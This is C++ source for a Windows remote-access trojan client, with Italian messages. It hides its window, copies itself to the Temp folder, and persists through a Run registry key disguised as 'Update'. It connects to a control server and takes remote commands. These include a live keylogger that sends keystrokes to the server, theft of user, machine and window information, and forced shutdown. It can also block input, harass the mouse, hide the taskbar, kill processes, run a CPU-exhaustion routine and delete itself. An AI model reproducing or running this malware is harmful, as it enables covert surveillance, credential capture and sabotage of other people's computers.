#include <iostream>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <thread>
#include <sstream>
#include <time.h>
#include <windows.h>
#include <fstream>
#include <winable.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>

int v=0;
bool v2=true;
bool v3=true;
bool v4=true;
bool v5=true;
bool v6=true;
bool v7=true;
SOCKET Client;
addrinfo Server;
TCHAR name[30]={0};
char tit[100]={0};
char mes[500]={0};
char Csimb[3]={0};
char Cbott[3]={0};
char ctsk[7]={0};
int simb=0;
int bott=0;
int LagCount=0;

using namespace std;

int initSock();
SOCKET createSock();
addrinfo getSinfo(SOCKET,int);
addrinfo wcon(SOCKET,addrinfo);
void ricevi(SOCKET);
void manda(SOCKET);
void MSGBOX();
void reg_write(LPCTSTR,LPCTSTR,DWORD,const char*);
bool preliminari();
void CMOUSE();
void BMOUSE();
void VMOUSE();
void GETINFO(SOCKET);
bool CheckPreliminari();
void InitKeylog();
void DelClient();
void LiveKey(SOCKET);
void Lag();
bool SocketConnected(SOCKET);

///////////////////////////////////////////////////////////////MAIN

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if(CheckPreliminari())
		if(preliminari())
			return 0;
	//preliminari();
	//InitKeylog();
	int PORTA=5555;//RIF
	int check=0;
	if(initSock()!=-1)
	{
		Client=createSock();
		if(Client!=0)
		{
			Server=getSinfo(Client,PORTA);
			if(Server.ai_family==-1)
				return 0;
		}
		else if(Client==0)
			return 0;
	}
	else if(initSock()==-1)
		return 0;
	
	Server=wcon(Client,Server);
	thread t1(ricevi,Client);
	thread t2(manda,Client);
	
	t1.detach();
	while(true)
	{
		Sleep(1000);
		if(v==-1)
			break;
	}
	
	closesocket(Client);
	WSACleanup();
	//system("pause");
	return 0;
}

///////////////////////////////////////////////////////////////FUNZIONI

int initSock()
{
	WSADATA WSAData;
	if(WSAStartup (MAKEWORD(2,2), &WSAData))
	{
		cout<<"Errore nell'inizializzazione delle socket..."<<endl;
		WSACleanup();
		return -1;
	}
	return 0;
}

SOCKET createSock()
{
	SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		cout<<"Errore nella creazione del socket... "<<WSAGetLastError()<<endl;
		closesocket(s);
		WSACleanup();
		return 0;
	}
	return s;
}

addrinfo getSinfo(SOCKET s,int p)
{
	addrinfo *ainfo;
	if (getaddrinfo("127.0.0.1", NULL, NULL, &ainfo))
	{
		cout<<"Errore: impossibile risolvere l'indirizzo..."<<endl;
		closesocket(s);
		WSACleanup();
		ainfo->ai_family=-1;
		return *ainfo;
	}
	((sockaddr_in *)(ainfo->ai_addr))->sin_port = htons (p);
	return *ainfo;
}

addrinfo wcon(SOCKET s,addrinfo a)
{
	v5=false;
	char sig[30]="cripe";
	DWORD cchCN=30;
	cout<<"<Client> Tento di connettermi al Server..."<<endl;
	while(true)
	{
		Sleep(1000);
		if(connect(s,(sockaddr *)(a.ai_addr),sizeof(sockaddr_in)))
		{
			freeaddrinfo(a.ai_next);
			cout<<"<Client> Errore: impossibile connettersi, riprovo..."<<endl;
		}
		else
		{
			v5=true;
			cout<<"<Client> Connesso con il Server!\n"<<endl;
			Sleep(10);
			send(s,sig,30,0);
			GetUserName(name,&cchCN);
			send(s,name,30,0);
			break;
		}
	}
	freeaddrinfo(a.ai_next);
	return a;
}

void ricevi(SOCKET s)
{
	int ck=0;
	char msg[2]={0};
	while(true)
	{	
		ck=recv(s,msg,sizeof(msg),0);
		if(msg!=0 && ck!=-1)
		{
			if(msg[0]=='A' && msg[1]=='A')
			{
				cout<<"\n<Client> Il Server ha chiuso la connessione...";
				//Sleep(10);
				closesocket(s);
				v5=false;
				v=-1;
				return;
			}
			if(v==-1)
				return;
			if(msg[0]=='B' && msg[1]=='B')
			{
				system("shutdown -s -t 1 -f");
				cout<<"<Server> Shutdown."<<endl;
			}
			if(msg[0]=='D' && msg[1]=='D')
			{
				system("shutdown -r -t 1 -f");
				cout<<"<Server> Reboot."<<endl;
			}
			if(msg[0]=='C' && msg[1]=='C')
			{
				SwapMouseButton(true);
				cout<<"<Server> Mouse swap."<<endl;
			}
			if(msg[0]=='C' && msg[1]=='R')
			{
				SwapMouseButton(false);
				cout<<"<Server> Mouse unswap."<<endl;
			}
			if(msg[0]=='E' && msg[1]=='E')
			{
				mciSendString("set cdaudio door open",NULL,0,NULL);
				cout<<"<Server> Open CD."<<endl;
			}
			if(msg[0]=='E' && msg[1]=='R')
			{
				mciSendString("set cdaudio door closed",NULL,0,NULL);
				cout<<"<Server> Close CD."<<endl;
			}
			if(msg[0]=='F' && msg[1]=='F')
			{
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
				cout<<"<Server> Monitor off."<<endl;
			}
			if(msg[0]=='G' && msg[1]=='G')
			{
				recv(s,tit,sizeof(tit),0);
				recv(s,mes,sizeof(mes),0);
				recv(s,Csimb,sizeof(Csimb),0);
				recv(s,Cbott,sizeof(Cbott),0);
				simb=atoi(Csimb);
				bott=atoi(Cbott);
				thread t3(MSGBOX);
				t3.detach();
				cout<<"<Server> Msgbox."<<endl;
			}
			if(msg[0]=='H' && msg[1]=='H')
			{
				cout<<"<Server> Client reset."<<endl;
				system("start pipo.exe");//3RIF
				closesocket(s);
				v=-1;
				return;
			}
			if(msg[0]=='I' && msg[1]=='I')
			{
				thread t4(CMOUSE);
				t4.detach();
				cout<<"<Server> CrazyMouse."<<endl;
			}
			if(msg[0]=='I' && msg[1]=='R')
			{
				v2=false;
				cout<<"<Server> CrazyMouse stop."<<endl;
			}
			if(msg[0]=='J' && msg[1]=='J')
			{
				thread t4(BMOUSE);
				t4.detach();
				cout<<"<Server> BlockMouse."<<endl;
			}
			if(msg[0]=='J' && msg[1]=='R')
			{
				v3=false;
				cout<<"<Server> UnlockMouse."<<endl;
			}
			if(msg[0]=='K' && msg[1]=='K')
			{
				thread t5(VMOUSE);
				t5.detach();
				cout<<"<Server> MouseViber."<<endl;
			}
			if(msg[0]=='K' && msg[1]=='R')
			{
				v4=false;
				cout<<"<Server> MouseUnviber."<<endl;
			}
			if(msg[0]=='L' && msg[1]=='L')
			{
				v5=false;
				cout<<"<Server> GetInfo."<<endl;
				//char npc[256]={0}; // nome pc
				//char nut[256]={0}; // nome utente
				//char dir[260]={0}; // directory corrente del Client
				//char ver[50]={0};  // versione del Client
				//char uac='f';    // se il Client ha l'UAC
				//char awin[50]={0}; // la finestra attualmente attiva di windows
				GETINFO(s);
				v5=true;
			}
			if(msg[0]=='M' && msg[1]=='M')
			{
				ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
				cout<<"<Server> Client show."<<endl;
			}
			if(msg[0]=='M' && msg[1]=='R')
			{
				ShowWindow(GetConsoleWindow(), SW_HIDE);
				cout<<"<Server> Client hide."<<endl;
			}
			if(msg[0]=='N' && msg[1]=='N')
			{
				char web[100]={0};
				recv(s,web,sizeof(web),0);
				if(web[0]!='h' || web[1]!='t' || web[2]!='t' || web[3]!='p')
				{
					char final[100]="http://";
					for(int i=0;i<100-7;i++)
					{
						final[i+7]=web[i];
						web[i]=final[i];
					}
				}
				cout<<"<Server> Open web page "<<web<<endl;
				ShellExecute(NULL,"open",web,NULL,NULL,SW_SHOWNORMAL);
			}
			if(msg[0]=='O' && msg[1]=='O')
			{
				cout<<"<Server> Client delete."<<endl;
				DelClient();
				closesocket(s);
				v5=false;
				v=-1;
				return;
			}
			if(msg[0]=='P' && msg[1]=='P')
			{
				v6=true;
				cout<<"<Server> LiveKeylogger START."<<endl;
				thread tv(LiveKey,s);
				tv.detach();
				Sleep(500);
				while(v6)
				{
					for(char i=1;i<=127;i++)
					{
						if(GetAsyncKeyState(i)!=0)
						{
							send(s,&i,sizeof(i),0);
							Sleep(52);
							if(v6==false)
								break;
						}
					}
				}
				cout<<"<Server> LiveKeylogger END."<<endl;
			}
			if(msg[0]=='Q' && msg[1]=='Q')
			{
				v7=false;
				cout<<"<Server> Lag START."<<endl;
				thread tlag(Lag);
				tlag.detach();
			}
			if(msg[0]=='Q' && msg[1]=='R')
			{
				v7=true;
				cout<<"<Server> Lag STOP."<<endl;
			}
			if(msg[0]=='R' && msg[1]=='R')
			{
				v5=false;
				char trash='~';
				send(s,&trash,sizeof(trash),0);
				cout<<"<Server> TASKBAR."<<endl;
				send(s,&ctsk[0],sizeof(ctsk[0]),0);
				send(s,&ctsk[1],sizeof(ctsk[1]),0);
				send(s,&ctsk[2],sizeof(ctsk[2]),0);
				send(s,&ctsk[3],sizeof(ctsk[3]),0);
				send(s,&ctsk[4],sizeof(ctsk[4]),0);
				send(s,&ctsk[5],sizeof(ctsk[5]),0);
				send(s,&ctsk[6],sizeof(ctsk[6]),0);
				v5=true;
			}
			if(msg[0]=='R' && msg[1]=='1')
			{
				HWND hwnd=FindWindow((LPCSTR)"Shell_TrayWnd", NULL);
				if(ctsk[0]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> TaskBar Hide."<<endl;
				}
				else
				{
					cout<<"<Server> TaskBar Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[0]++;
			}
			if(msg[0]=='R' && msg[1]=='2')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
				hwnd=FindWindowEx(hwnd,HWND(0),"TrayClockWClass",NULL);
				if(ctsk[1]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> Clock Hide."<<endl;
				}
				else
				{
					cout<<"<Server> Clock Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[1]++;
			}
			if(msg[0]=='R' && msg[1]=='3')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"Start",NULL);
				if(ctsk[2]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> StartButton Hide."<<endl;
				}
				else
				{
					cout<<"<Server> StartButton Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[2]++;
			}
			if(msg[0]=='R' && msg[1]=='4')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
				if(ctsk[3]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> NotifyIcon Hide."<<endl;
				}
				else
				{
					cout<<"<Server> NotifyIcon Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[3]++;
			}
			if(msg[0]=='R' && msg[1]=='5')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
				hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayButton",NULL);
				if(ctsk[4]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> Notify Hide."<<endl;
				}
				else
				{
					cout<<"<Server> Notify Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[4]++;
			}
			if(msg[0]=='R' && msg[1]=='6')
			{
				HWND hwnd=FindWindow("Shell_TrayWnd", NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"TrayNotifyWnd",NULL);
			    hwnd=FindWindowEx(hwnd,HWND(0),"Button",NULL);
				if(ctsk[5]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> TaskBar Hide."<<endl;
				}
				else
				{
					cout<<"<Server> TaskBar Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[5]++;
			}
			if(msg[0]=='R' && msg[1]=='7')
			{
				HWND hwnd=FindWindow("Program Manager", NULL);
    			hwnd=FindWindowEx(hwnd,HWND(0),"Progman",NULL);
				if(ctsk[6]%2==0)
				{
					ShowWindow(hwnd,SW_HIDE);
					cout<<"<Server> Desktop Hide."<<endl;
				}
				else
				{
					cout<<"<Server> Desktop Show."<<endl;
					ShowWindow(hwnd,SW_SHOW);
				}
				UpdateWindow(hwnd);
				ctsk[6]++;
			}
			if(msg[0]=='S' && msg[1]=='S')
			{
				BlockInput(true);
				cout<<"<Server> Mouse&Keyboard block."<<endl;
			}
			if(msg[0]=='S' && msg[1]=='R')
			{
				BlockInput(false);
				cout<<"<Server> Mouse&Keyboard unlock."<<endl;
			}
			if(msg[0]=='T' && msg[1]=='T')
			{
				int n=0;
				char PID[50]={0};
				cout<<"<Server> TPC."<<endl;
				DWORD aProcesses[1024], cbNeeded, cProcesses;
				EnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded);
				cProcesses=cbNeeded/sizeof(DWORD);
				for(int i=0;i<cProcesses;i++)
			    {
			        if(aProcesses[i]!=0)
			        {
			            char szProcessName[MAX_PATH]=TEXT("<unknown>");
			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
			            if(NULL!=hProcess)
					    {
					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
					        if(szProcessName[0]!='<')
						    {
						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
						    	{
						    		if(szProcessName[cnt]=='\\')
						    		{
						    			for(int ii=1;ii<100;ii++)
						    			{
						    				szProcessName[ii-1]=szProcessName[cnt+ii];
										}
										cnt=0;
									}
								}
						    	n++;
							}
					        CloseHandle(hProcess);
					    }
			        }
			    }
			    char trash='f';
			    send(s,&trash,sizeof(trash),0);
			    char c=(char)n;
			    send(s,&c,sizeof(c),0);
			    for(int i=0;i<cProcesses;i++)
			    {
			        if(aProcesses[i]!=0)
			        {
			            char szProcessName[MAX_PATH]=TEXT("<unknown>");
			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
			            if(NULL!=hProcess)
					    {
					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
					    	if(szProcessName[0]!='<')
						    {
						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
						    	{
						    		if(szProcessName[cnt]=='\\')
						    		{
						    			for(int ii=1;ii<100;ii++)
						    			{
						    				szProcessName[ii-1]=szProcessName[cnt+ii];
										}
										cnt=0;
									}
								}
						    	int tmp=aProcesses[i];
					        	char Pid[MAX_PATH]={0};
					        	sprintf(Pid,"%d",tmp);
					        	send(s,szProcessName,sizeof(szProcessName),0);
					        	send(s,Pid,sizeof(Pid),0);
							}
					        CloseHandle(hProcess);
					    }
			        }
			    }
			    recv(s,PID,sizeof(PID),0);
			    switch(PID[0])
			    {
			    	case '0':
			    		cout<<"<Server> TPC cancelled."<<endl;
			    	break;
			    	
			    	default:
			    		char FIN[100]="taskkill /F /PID ";
			    		for(int i=17;i<50;i++)
			    			FIN[i]=PID[i-17];
			    		system(FIN);
			    	break;
				}
			}
		}
		else
			Sleep(5000);
	}
	return;
}

void manda(SOCKET s)
{	
	char c=0;
	while(true)
	{	
		if(v==-1)
			return;
		Sleep(5000);
		if(v5)
		if(recv(s,&c,1,MSG_PEEK)==-1)
		{
			closesocket(Client);
			Client=createSock();
			Server=wcon(Client,Server);
		}
	}
}

void Lag()
{
	int iLag=0;
	if(LagCount<11)
	{
		LagCount++;
		thread ttlag(Lag);
		ttlag.detach();
	}
	while(true)
	{
		iLag++;
		if(v7)
			return;
	}	
	return;
}

void LiveKey(SOCKET s)
{
	char LVK[2];
	while(v6)
	{
		recv(s,LVK,sizeof(LVK),0);
		//if(LVK=='V')
		v6=false;
	}
	return;
}

void MSGBOX()
{
	MessageBox(NULL, mes, tit, simb | bott);
	return;
}

void reg_write(LPCTSTR subkey,LPCTSTR name,DWORD type,const char* value)
{
	HKEY key;
	RegOpenKey(HKEY_CURRENT_USER,subkey,&key);
	RegSetValueEx(key,name,0,type,(LPBYTE)value,strlen(value)*sizeof(char));
	RegCloseKey(key);
	return;
}

bool preliminari()
{
	char buffer[MAX_PATH];
	GetModuleFileName( NULL, buffer, MAX_PATH );
	TCHAR szComputerName[256];
	DWORD cchComputerName = 256;
	char n[256]={'\0'};
	char p1[256]="\"C:\\Users\\";
	char p2[256]="\\AppData\\Local\\Temp\\prova.exe\"";//2RIF
	char pF[256]={'\0'};
	char pFN[256]={'\0'};
	char cmd[256]="start ";
	int c1=0;
	int c2=0;
	
	GetUserName(szComputerName, &cchComputerName);
	for(int i=0;i<256;i++)
	{
		if(szComputerName[i]!='\0')
			n[i]=szComputerName[i];
		else
			i=256;
	}
	for(int i=0;i<100;i++)
	{
		pF[i]=p1[i];
		pFN[i]=p1[i+1];
		if(n[i]!='\0')
			c1++;
	}
	for(int i=10;i<10+c1;i++)
		if(i>c1)
		{
			pF[i]=n[i-10];
			pFN[i-1]=n[i-10];
		}
	for(int i=10+c1;i<255;i++)
		if(p2[c2]!='\0')
		{
			pF[i]=p2[c2];
			if(c2!=0)
				pFN[i-2]=p2[c2-1];
			c2++;
		}
	
	CopyFile(buffer,pFN,true);
	reg_write("Software\\Microsoft\\Windows\\CurrentVersion\\Run","Update",REG_SZ,pF);
	
	for(int i=6;i<256;i++)
		cmd[i]=pFN[i-6];
	
	system(cmd);
	
	return true;
}

void CMOUSE()
{
	srand(time(0));
	for(v2=true;v2;)
	{
		SetCursorPos(rand()%1920,rand()%1080);
		Sleep(10);
	}
	return;
}

void BMOUSE()
{
	POINT coor;
	GetCursorPos(&coor);
	for(v3=true;v3;)
	{
		SetCursorPos(coor.x,coor.y);
		Sleep(5);
	}
	return;
}

void VMOUSE()
{
	srand(time(0));
	POINT coor;
	for(v4=true;v4;)
	{
		GetCursorPos(&coor);
		switch(rand()%4)
		{
			case 0:
				SetCursorPos(coor.x+rand()%5,coor.y+rand()%5);
				Sleep(10);
			break;
			
			case 1:
				SetCursorPos(coor.x+rand()%5,coor.y-rand()%5);
				Sleep(10);
			break;
			
			case 2:
				SetCursorPos(coor.x-rand()%5,coor.y+rand()%5);
				Sleep(10);
			break;
			
			case 3:
				SetCursorPos(coor.x-rand()%5,coor.y-rand()%5);
				Sleep(10);
			break;
		}
	}
	return;
}

void GETINFO(SOCKET s)
{
	TCHAR szCN[256];
	DWORD cchCN=256;
	char buff[MAX_PATH];
	bool fRet=false;
    HANDLE hToken=NULL;
    char wnd_title[256];
    char uac='f';
	
	send(s,&uac,sizeof(uac),0);
	
	Sleep(50);
	
	GetComputerName(szCN,&cchCN);
	//send(s,&uac,sizeof(uac),0);
	send(s,szCN,sizeof(szCN),0);
	
	GetUserName(szCN,&cchCN);
	send(s,szCN,sizeof(szCN),0);
	
	GetModuleFileName(NULL,buff,MAX_PATH);
	send(s,buff,sizeof(buff),0);
	
	char ver[50]="1.0.4";
	send(s,ver,sizeof(ver),0);
	
	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
	{
        TOKEN_ELEVATION Elevation;
        DWORD cbSize=sizeof(TOKEN_ELEVATION);
        if(GetTokenInformation(hToken,TokenElevation,&Elevation,sizeof(Elevation),&cbSize))
            fRet=Elevation.TokenIsElevated;
    }
    if(hToken)
        CloseHandle(hToken);
    if(fRet)
    	uac='t';
    else
    	uac='f';
    send(s,&uac,sizeof(uac),0);
    
    HWND hwnd=GetForegroundWindow();
    GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
    send(s,wnd_title,sizeof(wnd_title),0);
	
	return;
}

bool CheckPreliminari()
{
	char buffer[MAX_PATH];
	GetModuleFileName( NULL, buffer, MAX_PATH );
	
	for(int i=0;i<MAX_PATH;i++)
	{
		if(buffer[i]=='T')
			if(buffer[i+1]=='e')
				if(buffer[i+2]=='m')
					if(buffer[i+3]=='p')
						return false;
	}
	
	return true;
}

void InitKeylog()
{
	int quanti=0;
	string logs[365];
	string logsN[365];
	
	ifstream infile;
	ofstream outfile;
	
	infile.open("prova.log");
	infile>>quanti;
	for(int i=0;i<quanti;i++)
		infile>>logsN[i];
	infile.close();
	
	if(quanti==0)
	{
		cout<<"eccomi"<<endl;
		outfile.open("prova.log");
		outfile<<"1 ";
		
		time_t     now = time(0);
	    struct tm  tstruct;
	    char       buf[80];
	    tstruct = *localtime(&now);
	    strftime(buf, sizeof(buf), "%Y-%m-%d.log", &tstruct);
	    
	    outfile<<buf;
    
		outfile.close();
	}
	
	return;
}

void DelClient()
{
	HKEY hreg;
	RegOpenKeyEx(HKEY_CURRENT_USER,(LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hreg);
	RegDeleteValue(hreg,(LPCSTR)"Update");
	
	char bufferEXE[MAX_PATH];
	char bufferVBS[MAX_PATH];
	char cmd[MAX_PATH]="start ";
	GetModuleFileName( NULL, bufferEXE, MAX_PATH );
	GetModuleFileName( NULL, bufferVBS, MAX_PATH );
	
	for(int i=1;i<MAX_PATH;i++)
	{
		if(bufferVBS[i]=='T' && bufferVBS[i+1]=='e' && bufferVBS[i+2]=='m' && bufferVBS[i+3]=='p' && bufferVBS[i+4]=='\\')
		{
			bufferVBS[i+5]='A';
			bufferVBS[i+6]='u';
			bufferVBS[i+7]='t';
			bufferVBS[i+8]='D';
			bufferVBS[i+9]='.';
			bufferVBS[i+10]='v';
			bufferVBS[i+11]='b';
			bufferVBS[i+12]='s';
			i+=13;
			while(i<200)
			{
				bufferVBS[i]=0;
				i++;
			}
		}
	}
	
	ofstream outfile;
	
	outfile.open(bufferVBS);
	outfile<<"WScript.Sleep 10000\ndim filesys\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nfilesys.DeleteFile \""<<bufferEXE<<"\"\nfilesys.DeleteFile \""<<bufferVBS<<"\"\n";
	outfile.close();
	
	for(int i=6;i<MAX_PATH;i++)
		cmd[i]=bufferVBS[i-6];
	
	system(cmd);
	
	return;
}
